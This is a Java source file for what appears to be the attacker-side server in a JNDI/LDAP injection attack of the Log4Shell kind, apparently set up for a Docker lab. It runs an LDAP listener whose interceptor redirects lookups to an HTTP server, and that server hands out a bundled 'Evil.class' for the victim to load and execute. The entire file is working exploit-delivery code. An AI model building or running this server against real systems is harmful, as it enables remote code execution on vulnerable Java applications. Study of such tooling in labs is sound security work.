import com.sun.net.httpserver.HttpServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.sdk.LDAPException;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.*;

import static java.util.concurrent.Executors.newCachedThreadPool;

public class Main {
    public static void main(String[] args) throws IOException, LDAPException {
        String host = "host.docker.internal";

        if (args.length > 0) {
            host = args[0];
        }

        setupLDAP(host);
        setupHTTP();
    }

    private static void setupLDAP(String host) throws LDAPException, MalformedURLException, UnknownHostException {
        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("dc=example,dc=com");

        config.setListenerConfigs(new InMemoryListenerConfig(
                "listen",
                InetAddress.getByName("0.0.0.0"),
                9999,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()
        ));
        config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL("http://" + host + ":8888/#Evil")));

        InMemoryDirectoryServer directoryServer = new InMemoryDirectoryServer(config);
        directoryServer.startListening();

        System.out.println("LDAP server listening on 0.0.0.0:9999");
    }

    private static void setupHTTP() throws IOException {
        byte[] targetArray = readEvil();
        HttpServer server = HttpServer.create(new InetSocketAddress(8888), 0);

        server.createContext("/", exchange -> {
            System.out.println("Send HTTP response for " + exchange.getRequestURI());
            exchange.sendResponseHeaders(200, targetArray.length);
            OutputStream os = exchange.getResponseBody();
            os.write(targetArray);
            os.close();
        });
        server.setExecutor(newCachedThreadPool());
        server.start();

        System.out.println("HTTP server listening on 0.0.0.0:8888");
    }

    private static byte[] readEvil() throws IOException {
        InputStream is = Main.class.getClassLoader().getResourceAsStream("Evil.class");
        ByteArrayOutputStream bos = new ByteArrayOutputStream();

        int nRead;
        byte[] data = new byte[4];

        while ((nRead = is.read(data, 0, data.length)) != -1) {
            bos.write(data, 0, nRead);
        }

        bos.flush();
        return bos.toByteArray();
    }
}